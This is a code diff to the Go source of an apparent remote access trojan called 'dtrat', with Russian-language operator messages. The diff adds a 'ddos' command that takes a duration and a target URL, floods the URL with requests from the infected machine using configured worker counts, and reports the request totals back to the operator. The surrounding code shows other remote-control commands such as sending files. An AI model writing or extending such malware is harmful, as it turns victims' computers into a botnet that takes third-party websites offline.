@@ -1,6 +1,7 @@
 package rat
 
 import (
+	"context"
 	"dtrat/config"
 	"dtrat/engine/system/usb"
 	"dtrat/transport"
@@ -8,6 +9,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"time"
 )
 
 func errToStatus(err error) string {
@@ -45,6 +47,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.volumeCmd(args)
 	case "sendfile":
 		go r.sendFile(args)
+	case "ddos":
+		go r.ddosCmd(args)
 	case "info":
 		go r.infoCmd()
 	default:
@@ -295,4 +299,30 @@ func (r *Rat) sendFile(args string) {
 	}
 
 	r.Transport.Send("Файл успешно отправлен: %s", args)
+}
+
+// /ddos [duration SEC] [url]
+func (r *Rat) ddosCmd(args string) {
+	dur, url := transport.ParseCommand(args)
+	duration, err := strconv.Atoi(dur)
+	if err != nil {
+		r.Transport.Send("Укажите длительность правильно")
+		return
+	}
+
+	attack, err := r.Engine.System.NewDDoS(url, r.Config.Engine.DdosWorkers)
+	if err != nil {
+		r.Transport.Send("Ошибка создания атаки: %v", err)
+		return
+	}
+
+	r.Transport.Send("Запуск атаки на %s в течение %d секунд", url, duration)
+
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+	defer cancel()
+
+	attack.Run(ctx)
+
+	s, t := attack.Result(ctx)
+	r.Transport.Send("Атака завершена! Всего запросов: %d, успешных: %d", t, s)
 }
